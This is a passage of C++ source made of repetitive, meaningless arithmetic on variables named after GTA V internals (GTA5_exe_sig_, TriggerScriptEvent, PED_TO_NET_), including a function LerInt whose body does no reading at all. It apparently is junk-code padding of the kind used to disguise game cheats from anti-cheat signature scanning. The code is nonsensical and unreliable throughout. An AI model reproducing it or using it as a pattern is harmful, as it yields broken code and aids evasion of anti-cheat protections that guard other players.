				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			int LerInt(std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
